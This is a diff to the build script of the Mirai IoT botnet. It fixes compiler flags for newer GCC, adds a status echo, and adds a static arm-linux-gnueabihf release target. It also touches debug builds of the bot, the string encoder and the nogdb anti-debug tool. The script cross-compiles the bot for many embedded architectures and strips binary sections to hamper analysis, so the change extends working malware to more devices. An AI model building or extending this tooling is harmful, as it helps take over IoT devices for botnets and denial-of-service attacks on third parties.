@@ -3,7 +3,8 @@
 FLAGS=""
 
 function compile_bot {
-    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    echo "Compiling $2"
+    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fcommon -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
     "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
 }
 
@@ -30,6 +31,7 @@ elif [ "$1" == "release" ]; then
     compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
     compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
+    compile_bot arm-linux-gnueabihf mirai.gnueabihf "$FLAGS -DKILLER_REBIND_SSH -static -Wno-unused-result"
     compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
@@ -48,10 +50,10 @@ elif [ "$1" == "release" ]; then
 
     go build -o release/scanListen tools/scanListen.go
 elif [ "$1" == "debug" ]; then
-    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
+    gcc -std=c99 bot/*.c -DDEBUG -fcommon "$FLAGS" -static -g -o debug/mirai.dbg
     mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
     armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
-    arm-linux-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7 #armv6l
+    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
     sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
     gcc -std=c99 tools/enc.c -g -o debug/enc
     gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
